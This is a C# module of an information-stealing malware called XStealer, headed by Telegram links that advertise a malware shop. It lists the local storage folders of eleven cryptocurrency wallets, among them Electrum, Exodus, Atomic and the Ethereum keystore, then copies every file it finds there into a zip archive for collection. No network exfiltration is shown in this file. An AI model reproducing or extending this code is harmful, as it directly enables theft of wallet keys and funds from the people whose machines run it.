// By https://t.me/devxstudio
// https://t.me/devx_channel
// SHOP MALWARE: https://t.me/devxstudiobot
namespace XStealer.Modules.Apps.Wallets
{
    using System.Collections.Generic;
    using System.IO;
    using System.Linq;
    using Helpers;

    public static class CryptoWallets
    {
        /// <summary>
        /// Словарный список где хранятся кошельки 
        /// </summary>
        private static readonly Dictionary<string, string> WalletsDirs = new Dictionary<string, string> 
        {
            ["Electrum"] = GlobalPaths.CombinePath(GlobalPaths.AppData, "Electrum", "wallets"),
            ["Electrum-Dash"] = GlobalPaths.CombinePath(GlobalPaths.AppData, "Electrum-DASH", "wallets"),
            ["Ethereum"] = GlobalPaths.CombinePath(GlobalPaths.AppData, "Ethereum", "keystore"),
            ["Exodus"] = GlobalPaths.CombinePath(GlobalPaths.AppData, "Exodus", "exodus.wallet"),
            ["Atomic"] = GlobalPaths.CombinePath(GlobalPaths.AppData, "atomic", "Local Storage", "leveldb"),
            ["Jaxx"] = GlobalPaths.CombinePath(GlobalPaths.AppData, "com.liberty.jaxx", "IndexedDB", "file__0.indexeddb.leveldb"),
            ["Coinomi"] = GlobalPaths.CombinePath(GlobalPaths.LocalAppData, "Coinomi", "Coinomi", "wallets"),
            ["Guarda"] = GlobalPaths.CombinePath(GlobalPaths.AppData, "Guarda", "Local Storage", "leveldb"),
            ["Armory"] = GlobalPaths.CombinePath(GlobalPaths.AppData, "Armory"),
            ["Zcash"] = GlobalPaths.CombinePath(GlobalPaths.AppData, "Zcash"),
            ["Bytecoin"] = GlobalPaths.CombinePath(GlobalPaths.AppData, "bytecoin"),
        };

        public static void GetInstalled()
        {
            foreach (KeyValuePair<string, string> wallet in WalletsDirs)
            {
                try
                {
                    foreach (string walletfiles in Directory.EnumerateFiles(wallet.Value, "*.*", SearchOption.AllDirectories).Where(wallet => File.Exists(wallet)))
                    {
                        try
                        {
                            if (walletfiles.EndsWith("wallet") || walletfiles.EndsWith("json")) { CounterEx.Wallets++; }
                            ZipEx.AddKeyPairStream($"CryptoWallets/{wallet.Key}/{Path.GetFileName(walletfiles)}", ConverterEx.ToBytes(false, walletfiles));
                        }
                        catch { continue; }
                    }
                }
                catch { continue; }
            }
        }


    }
}